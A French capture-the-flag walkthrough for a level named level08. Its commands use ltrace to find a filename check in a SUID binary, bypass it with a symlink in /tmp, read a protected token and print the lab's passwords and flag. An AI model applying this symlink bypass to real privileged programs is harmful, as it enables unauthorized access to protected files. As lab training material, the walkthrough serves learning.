# Level08

Connectez-vous en tant que `level08`.

    $ ssh 192.168.1.124 -p 4242 -l level08
    level08@192.168.1.124's password: fiumuikeil55xe9cu4dood66h
    
 ---

Un exécutable `SUID` et un fichier de token se trouvent dans le répertoire personnel.

        $ ls -l
        au total 16
        -rwsr-s---+ 1 flag08 level08 8617 5 mars 2016 level08
        -rw------- 1 flag08 flag08 26 mars 5 2016 token
        $ ./level08
        ./level08 [fichier à lire]
        $ ./level08 token
        You may not access 'token'
        $ cat token
        cat : token: Permission denied

Il semble que le fichier de token ne puisse pas être lu ni par `./level08` ni par `cat`.

Utilisez `ltrace` pour intercepter les appels de bibliothèque dynamiques et les appels système exécutés par le programme.

```gdb
$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff794, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                       = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                   = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
```

La fonction `strstr` localise une sous-chaîne `needle` dans la chaîne `haystack`.

On peut en déduire que si le fichier transmis a une chaîne de token dans le nom, il se ferme.

Faire un lien symbolique sans token dans un nom de fichier.

        $ ln -s /home/user/level08/token /tmp/link

Exécutez le binaire avec le lien symbolique et obtenez le mot de passe pour vous connecter à « flag08 ».

        $ ./level08 /tmp/link
        quif5eloekouj29ke0vouxean

Connectez-vous en tant que `flag08` et obtenez le flag.

        $ su flag08
        Password:
        Don't forget to launch getflag !
        $ getflag
        Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
